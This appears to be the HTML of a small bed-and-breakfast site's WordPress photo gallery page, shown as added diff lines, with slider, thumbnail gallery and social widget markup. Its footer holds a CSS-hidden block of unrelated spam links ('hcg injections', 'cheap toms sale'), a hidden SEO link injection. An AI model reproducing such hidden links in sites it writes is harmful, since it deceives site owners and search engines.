+         <div class="fp-slides-items" style="position: absolute; top: 0px; left: 0px; display: none; z-index: 5; opacity: 0; width: 959px; height: 299px;">
+          <div class="fp-thumbnail">
+           <a title="" href="">
+            <img alt="" src="http://bnbminiatura.net/wp-content/themes/bower/images/slides/3.jpg" />
+           </a>
+          </div>
+          <div class="fp-content-wrap">
+           <div class="fp-content">
+            <h3 class="fp-title">
+             <a title="" href="">
+             </a>
+            </h3>
+            <p>
+             <a href="" class="fp-more">
+              Read More
+             </a>
+            </p>
+           </div>
+          </div>
+         </div>
+         <div class="fp-slides-items" style="position: absolute; top: 0px; left: 0px; display: block; z-index: 6; opacity: 1; width: 959px; height: 299px;">
+          <div class="fp-thumbnail">
+           <a title="" href="">
+            <img alt="" src="http://bnbminiatura.net/wp-content/themes/bower/images/slides/4.jpg" />
+           </a>
+          </div>
+          <div class="fp-content-wrap">
+           <div class="fp-content">
+            <h3 class="fp-title">
+             <a title="" href="">
+             </a>
+            </h3>
+            <p>
+             <a href="" class="fp-more">
+              Read More
+             </a>
+            </p>
+           </div>
+          </div>
+         </div>
+         <div class="fp-slides-items" style="position: absolute; top: 0px; left: 0px; display: none; z-index: 1; opacity: 0; width: 100%; height: auto;">
+          <div class="fp-thumbnail">
+           <a title="" href="">
+            <img alt="" src="http://bnbminiatura.net/wp-content/themes/bower/images/slides/5.jpg" />
+           </a>
+          </div>
+          <div class="fp-content-wrap">
+           <div class="fp-content">
+            <h3 class="fp-title">
+             <a title="" href="">
+             </a>
+            </h3>
+            <p>
+             <a href="" class="fp-more">
+              Read More
+             </a>
+            </p>
+           </div>
+          </div>
+         </div>
+        </div>
+        <div class="fp-content-fon">
+        </div>
+        <div class="fp-fon-left">
+        </div>
+        <div class="fp-prev-next-wrap">
+         <div class="fp-prev-next">
+          <a class="fp-next" href="#fp-next">
+          </a>
+          <a class="fp-prev" href="#fp-prev">
+          </a>
+         </div>
+        </div>
+        <div class="bground">
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+   <div class="container" id="content-top">
+   </div>
+   <div id="content">
+    <div class="container clearfix">
+     <div class="sidebar right clearfix">
+      <div class="widget widget_search" id="search-2">
+       <div class="inner">
+        <div title="" class="searchform">
+         <form action="http://bnbminiatura.net/" ifaviconffd="searchform" method="get">
+          <input type="submit" class="searchbtn" value="" />
+          <input type="text" onfocus="if (this.value == 'Search') {this.value = '';}" onblur="if (this.value == '')  {this.value = 'Search';}" id="s" name="s" class="searchtxt" value="Search" />
+          <div style="clear:both">
+          </div>
+         </form>
+        </div>
+        <!-- #search -->
+       </div>
+      </div>
+      <div class="widget widget_pages" id="pages-2">
+       <div class="inner">
+        <div class="caption">
+         <h3>
+          Quick Link
+         </h3>
+        </div>
+        <ul>
+         <li class="page_item page-item-2">
+          <a href="http://bnbminiatura.net/">
+           Home
+          </a>
+         </li>
+         <li class="page_item page-item-34">
+          <a href="http://bnbminiatura.net/nearest-from/">
+           Nearest From
+          </a>
+         </li>
+         <li class="page_item page-item-20">
+          <a href="http://bnbminiatura.net/prices-and-services/">
+           Prices and Services
+          </a>
+         </li>
+         <li class="page_item page-item-12 current_page_item">
+          <a href="http://bnbminiatura.net/photo-gallery/">
+           Photo Gallery
+          </a>
+         </li>
+         <li class="page_item page-item-15">
+          <a href="http://bnbminiatura.net/contact-us/">
+           Contact Us
+          </a>
+         </li>
+        </ul>
+       </div>
+      </div>
+     </div>
+     <!-- ddd-->
+     <div id="main_content">
+      <div class="articles">
+       <div class="one-post">
+        <div class="post-body">
+         <div class="post-caption post-12 page type-page status-publish hentry" id="post-12">
+          <h1>
+          </h1>
+         </div>
+         <!-- Switch for global css  -->
+         <style type="text/css">
+          /*noinspection ALL*/
+				.dynamic_css {
+					border: 2px solid #000000 !important;
+					border-radius: 2px !important;
+					-moz-border-radius: 2px !important;
+					-webkit-border-radius: 2px !important;
+					-khtml-border-radius: 2px !important;
+					-o-border-radius: 2px !important;
+				}
+				.dynamic_css img {
+					margin: 0 !important;
+					padding: 0 !important;
+					border: 0 !important;
+				}
+				.dynamic_css p
+				{
+					margin :0px !important; 
+				}
+				.thumbnail_width855				{
+					width: 160px !important;
+					height: 120px !important;
+					box-sizing: border-box !important;
+				}
+				/*noinspection ALL*/
+				.images-in-row_855 a, 
+				.widget-images-in-row_855 a
+				{
+					border-bottom: none !important;
+				}
+									.imgLiquidFill {
+													width: 164px !important;
+							box-sizing: border-box !important;
+													height: 120px !important;
+					}
+										.images-in-row_855 a:hover
+					{
+						text-decoration:none !important;
+					}
+					.margin_thumbs {
+						margin-right: 5px !important;
+						margin-bottom: 5px !important;
+					}
+									/*noinspection ALL*/
+				.opactiy_thumbs {
+					opacity: 1 !important;
+					-moz-opacity: 1 !important;
+					-khtml-opacity: 1 !important;
+				}
+				/*noinspection ALL*/
+				.shutter-gb-img-wrap 
+				{
+					margin-right: 5px !important;
+					margin-bottom: 5px !important;
+				}
+				.overlay_text &gt; h5 {
+					margin-top:10px !important;
+					padding: 0 10px 0 10px !important;
+					line-height: 1.5em !important;
+					direction: inherit !important;
+					text-align: center !important;
+					font-family: Verdana !important;
+					color: #ffffff !important;
+					font-size: 16px !important;
+				}
+				.overlay_text &gt; p {
+					padding: 10px 10px 0 10px !important;
+					line-height: 1.5em !important;
+					direction: inherit !important;
+					text-align: center !important;
+					font-family: Verdana !important;
+					color: #ffffff !important;
+					font-size: 12px !important;
+				}
+					.pp_pic_holder.pp_default {
+			background-color: #ffffff;
+		}
+		div.pp_overlay {
+			background-color: #000000 !important;
+			opacity: 0.6 !important;
+			-moz-opacity: 0.6 !important;
+			filter: alpha(opacity=0.6);
+		}
+		.pp_description p {
+			direction: inherit !important;
+			color: #ffffff !important;
+			text-align: left !important;
+			font-family: Verdana !important;
+			font-size: 12px !important;
+		}
+		.pp_description h5 {
+			direction: inherit !important;
+			color: #ffffff !important;
+			text-align: left !important;
+			font-family: Verdana !important;
+			font-size: 16px !important;
+		}
+		.ppt {
+			display: none !important;
+		}
+		div.pp_pic_holder {
+			border: 5px solid #ffffff !important;
+			border-radius: 5px !important;
+			-moz-border-radius: 5px !important;
+			-webkit-border-radius: 5px !important;
+			-khtml-border-radius: 5px !important;
+			-o-border-radius: 5px !important;
+		}
+         </style>
+         <!-- Global Styling  -->
+         <h3>
+          Demo Album
+         </h3>
+         <h5>
+         </h5>
+         <style>
+          .images-in-row_855 &gt; a
+{
+ text-decoration:none !important;
+}
+         </style>
+         <div id="gallery-bank-thumbnails_855" class="images-in-row_855">
+          <a id="ux_img_div_855" data-title="" href="http://bnbminiatura.net/wp-content/gallery-bank/gallery-uploads/o_19rsvsole12s51ck736i7qq61jk.jpg" rel="855prettyPhoto[gallery]">
+           <div class="dynamic_css margin_thumbs thumbnail_width855 widget_margin_thumbs855 gb_overlay">
+            <div class="widgetImgLiquidFill855 imgLiquidFill opactiy_thumbs imgLiquid_bgSize imgLiquid_ready" style='background-image: url("http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsole12s51ck736i7qq61jk.jpg"); background-size: cover; background-position: center center; background-repeat: no-repeat;'>
+             <div class="overlay_text">
+              <h5>
+              </h5>
+             </div>
+             <img src="http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsole12s51ck736i7qq61jk.jpg" type="image" id="ux_gb_img_855" imageid="18" style="display: none;" />
+            </div>
+           </div>
+          </a>
+          <a id="ux_img_div_855" data-title="" href="http://bnbminiatura.net/wp-content/gallery-bank/gallery-uploads/o_19rsvsole19m11rrsgsmk2nofpj.jpg" rel="855prettyPhoto[gallery]">
+           <div class="dynamic_css margin_thumbs thumbnail_width855 widget_margin_thumbs855 gb_overlay">
+            <div class="widgetImgLiquidFill855 imgLiquidFill opactiy_thumbs imgLiquid_bgSize imgLiquid_ready" style='background-image: url("http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsole19m11rrsgsmk2nofpj.jpg"); background-size: cover; background-position: center center; background-repeat: no-repeat;'>
+             <div class="overlay_text">
+              <h5>
+              </h5>
+             </div>
+             <img src="http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsole19m11rrsgsmk2nofpj.jpg" type="image" id="ux_gb_img_855" imageid="17" style="display: none;" />
+            </div>
+           </div>
+          </a>
+          <a id="ux_img_div_855" data-title="" href="http://bnbminiatura.net/wp-content/gallery-bank/gallery-uploads/o_19rsvsole18j1t4o73akcv1mkgi.jpg" rel="855prettyPhoto[gallery]">
+           <div class="dynamic_css margin_thumbs thumbnail_width855 widget_margin_thumbs855 gb_overlay">
+            <div class="widgetImgLiquidFill855 imgLiquidFill opactiy_thumbs imgLiquid_bgSize imgLiquid_ready" style='background-image: url("http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsole18j1t4o73akcv1mkgi.jpg"); background-size: cover; background-position: center center; background-repeat: no-repeat;'>
+             <div class="overlay_text">
+              <h5>
+              </h5>
+             </div>
+             <img src="http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsole18j1t4o73akcv1mkgi.jpg" type="image" id="ux_gb_img_855" imageid="16" style="display: none;" />
+            </div>
+           </div>
+          </a>
+          <a id="ux_img_div_855" data-title="" href="http://bnbminiatura.net/wp-content/gallery-bank/gallery-uploads/o_19rsvsole1u4v1eh45uua4q155th.jpg" rel="855prettyPhoto[gallery]">
+           <div class="dynamic_css margin_thumbs thumbnail_width855 widget_margin_thumbs855 gb_overlay">
+            <div class="widgetImgLiquidFill855 imgLiquidFill opactiy_thumbs imgLiquid_bgSize imgLiquid_ready" style='background-image: url("http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsole1u4v1eh45uua4q155th.jpg"); background-size: cover; background-position: center center; background-repeat: no-repeat;'>
+             <div class="overlay_text">
+              <h5>
+              </h5>
+             </div>
+             <img src="http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsole1u4v1eh45uua4q155th.jpg" type="image" id="ux_gb_img_855" imageid="15" style="display: none;" />
+            </div>
+           </div>
+          </a>
+          <a id="ux_img_div_855" data-title="" href="http://bnbminiatura.net/wp-content/gallery-bank/gallery-uploads/o_19rsvsoleo4affksb71tac1527l.jpg" rel="855prettyPhoto[gallery]">
+           <div class="dynamic_css margin_thumbs thumbnail_width855 widget_margin_thumbs855 gb_overlay">
+            <div class="widgetImgLiquidFill855 imgLiquidFill opactiy_thumbs imgLiquid_bgSize imgLiquid_ready" style='background-image: url("http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsoleo4affksb71tac1527l.jpg"); background-size: cover; background-position: center center; background-repeat: no-repeat;'>
+             <div class="overlay_text">
+              <h5>
+              </h5>
+             </div>
+             <img src="http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsoleo4affksb71tac1527l.jpg" type="image" id="ux_gb_img_855" imageid="19" style="display: none;" />
+            </div>
+           </div>
+          </a>
+          <a id="ux_img_div_855" data-title="" href="http://bnbminiatura.net/wp-content/gallery-bank/gallery-uploads/o_19rsvsole1ajb1qpic6b2t18r2m.jpg" rel="855prettyPhoto[gallery]">
+           <div class="dynamic_css margin_thumbs thumbnail_width855 widget_margin_thumbs855 gb_overlay">
+            <div class="widgetImgLiquidFill855 imgLiquidFill opactiy_thumbs imgLiquid_bgSize imgLiquid_ready" style='background-image: url("http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsole1ajb1qpic6b2t18r2m.jpg"); background-size: cover; background-position: center center; background-repeat: no-repeat;'>
+             <div class="overlay_text">
+              <h5>
+              </h5>
+             </div>
+             <img src="http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsole1ajb1qpic6b2t18r2m.jpg" type="image" id="ux_gb_img_855" imageid="20" style="display: none;" />
+            </div>
+           </div>
+          </a>
+          <a id="ux_img_div_855" data-title="" href="http://bnbminiatura.net/wp-content/gallery-bank/gallery-uploads/o_19rsvsole1r5p19v2c1rjvoeelo.jpg" rel="855prettyPhoto[gallery]">
+           <div class="dynamic_css margin_thumbs thumbnail_width855 widget_margin_thumbs855 gb_overlay">
+            <div class="widgetImgLiquidFill855 imgLiquidFill opactiy_thumbs imgLiquid_bgSize imgLiquid_ready" style='background-image: url("http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsole1r5p19v2c1rjvoeelo.jpg"); background-size: cover; background-position: center center; background-repeat: no-repeat;'>
+             <div class="overlay_text">
+              <h5>
+              </h5>
+             </div>
+             <img src="http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsole1r5p19v2c1rjvoeelo.jpg" type="image" id="ux_gb_img_855" imageid="22" style="display: none;" />
+            </div>
+           </div>
+          </a>
+          <a id="ux_img_div_855" data-title="" href="http://bnbminiatura.net/wp-content/gallery-bank/gallery-uploads/o_19rsvsolehl367t1vh5m65i4hn.jpg" rel="855prettyPhoto[gallery]">
+           <div class="dynamic_css margin_thumbs thumbnail_width855 widget_margin_thumbs855 gb_overlay">
+            <div class="widgetImgLiquidFill855 imgLiquidFill opactiy_thumbs imgLiquid_bgSize imgLiquid_ready" style='background-image: url("http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsolehl367t1vh5m65i4hn.jpg"); background-size: cover; background-position: center center; background-repeat: no-repeat;'>
+             <div class="overlay_text">
+              <h5>
+              </h5>
+             </div>
+             <img src="http://bnbminiatura.net/wp-content/gallery-bank/thumbs/o_19rsvsolehl367t1vh5m65i4hn.jpg" type="image" id="ux_gb_img_855" imageid="21" style="display: none;" />
+            </div>
+           </div>
+          </a>
+         </div>
+         <div class="separator-doubled">
+         </div>
+         <script type="text/javascript">
+          jQuery(function () {
+					jQuery(".imgLiquidFill").imgLiquid({fill: true});
+				});
+         </script>
+         <script type="text/javascript">
+          jQuery(document).ready(function () {
+			jQuery("a[rel^=\"855prettyPhoto\"]").prettyPhoto
+			({
+				hook: "rel",
+				animation_speed: 500, 
+				slideshow: 5000,
+				autoplay_slideshow: false,
+				opacity: 0.80,
+				show_title: false,
+				allow_resize: true,
+				deeplinking: false,
+				changepicturecallback: onPictureChanged
+			});
+		});
+		function onPictureChanged() 
+		{
+			var google_plus_icon = "&lt;g:plusone data-action='share' href='"+ encodeURIComponent(location.href.replace(location.hash,'')) +"' width='160px' style='margin-left:5px; display:inline-block;'&gt;&lt;/g:plusone&gt;";
+			jQuery(".pp_social").append(google_plus_icon);
+			jQuery(".pp_social").append("&lt;script type='text/javascript'&gt;\
+			(function() { \
+			var po = document.createElement('script');\
+			po.type = 'text/javascript';\
+			po.async = true;\
+			po.src = 'https://apis.google.com/js/plusone.js';\
+			var s = document.getElementsByTagName('script')[0];\
+			s.parentNode.insertBefore(po, s);\
+			})(); &lt;" + "/" +  "script&gt;");
+		}
+         </script>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+   <div id="smthemes_share">
+    <ul class="inner">
+     <li>
+      <iframe frameborder="0" allowtransparency="true" style="border:none; overflow:hidden; width:50px; height:65px;" scrolling="no" src="//www.facebook.com/plugins/like.php?href=http://bnbminiatura.net/photo-gallery/&send=false&layout=box_count&width=50&show_faces=false&action=like&colorscheme=light&font&height=65&locale=en_US">
+      </iframe>
+     </li>
+     <li>
+      <iframe frameborder="0" id="twitter-widget-0" scrolling="no" allowtransparency="true" class="twitter-share-button twitter-share-button-rendered twitter-tweet-button" style="position: static; visibility: visible; width: 60px; height: 61px;" title="Twitter Tweet Button" src="http://platform.twitter.com/widgets/tweet_button.e00c464da75b252cb1a028400793cadc.en.html#_=1447443042821&count=vertical&dnt=false&id=twitter-widget-0&lang=en&original_referer=http%3A%2F%2Fbnbminiatura.net%2Fphoto-gallery%2F&size=m&text=Photo%20Gallery&type=share&url=http%3A%2F%2Fbnbminiatura.net%2Fphoto-gallery%2F">
+      </iframe>
+      <script>
+       !function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");
+      </script>
+     </li>
+     <li>
+      <div style="text-indent: 0px; margin: 0px; padding: 0px; background: transparent none repeat scroll 0% 0%; border-style: none; float: none; line-height: normal; font-size: 1px; vertical-align: baseline; display: inline-block; width: 50px; height: 60px;" id="___plusone_0">
+       <iframe width="100%" frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" style="position: static; top: 0px; width: 50px; margin: 0px; border-style: none; left: 0px; visibility: visible; height: 60px;" tabindex="0" vspace="0" id="I0_1447443042419" name="I0_1447443042419" src="https://apis.google.com/se/0/_/+1/fastbutton?usegapi=1&size=tall&origin=http%3A%2F%2Fbnbminiatura.net&url=http%3A%2F%2Fbnbminiatura.net%2Fphoto-gallery%2F&gsrc=3p&ic=1&jsh=m%3B%2F_%2Fscs%2Fapps-static%2F_%2Fjs%2Fk%3Doz.gapi.it.aCXbJZfqGQQ.O%2Fm%3D__features__%2Fam%3DAQ%2Frt%3Dj%2Fd%3D1%2Ft%3Dzcms%2Frs%3DAGLTcCP5Saai5YGV2NdbtCHaQRhq7XNyqA#_methods=onPlusOne%2C_ready%2C_close%2C_open%2C_resizeMe%2C_renderstart%2Concircled%2Cdrefresh%2Cerefresh&id=I0_1447443042419&parent=http%3A%2F%2Fbnbminiatura.net&pfname=&rpctoken=31178147" data-gapiattached="true" title="+1">
+       </iframe>
+      </div>
+      <script type="text/javascript">
+       (function() {
+				var po = document.createElement("script"); po.type = "text/javascript"; po.async = true;
+				po.src = "https://apis.google.com/js/plusone.js";
+				var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(po, s);
+			  })();
+      </script>
+     </li>
+    </ul>
+   </div>
+   <div id="content-bottom">
+    <div class="back">
+    </div>
+   </div>
+   <div id="footer">
+    <div class="container clearfix">
+     <div class="footer-widgets-container">
+      <div class="footer-widgets">
+       <div class="widgetf">
+       </div>
+       <div class="widgetf">
+       </div>
+       <div class="widgetf widgetf_last">
+       </div>
+      </div>
+     </div>
+    </div>
+    <style>
+     .smthemes{
+height: 0px;
+overflow: hidden;
+}
+    </style>
+    <div class="footer_txt">
+     <div class="container">
+      <div class="top_text">
+       Copyright © 2015
+       <a href="http://welcomerentals.com">
+        Welcomerentals.com
+       </a>
+      </div>
+      <div class="smthemes">
+       Designed by
+       <a target="_blank" href="http://iuseit.net/">
+        hcg
+       </a>
+       , thanks to:
+       <a target="_blank" href="http://ywebsite123.com/">
+        http://ywebsite123.com/
+       </a>
+       ,
+       <a target="_blank" href="http://lehighstudy.com/">
+        hcg injections
+       </a>
+       and
+       <a target="_blank" href="http://cheaptomssale.co.uk/">
+        cheap toms sale
+       </a>
+      </div>
+     </div>
+    </div>
+    <script src="http://bnbminiatura.net/wp-includes/js/comment-reply.min.js?ver=4.2.5" type="text/javascript">
+    </script>
+   </div>
+  </div>
+  <iframe name="oauth2relay870508272" id="oauth2relay870508272" src="https://accounts.google.com/o/oauth2/postmessageRelay?parent=http%3A%2F%2Fbnbminiatura.net#rpctoken=485343803&forcesecure=1" style="width: 1px; height: 1px; position: absolute; top: -100px;" tabindex="-1">
+  </iframe>
+ </body>
+</html>
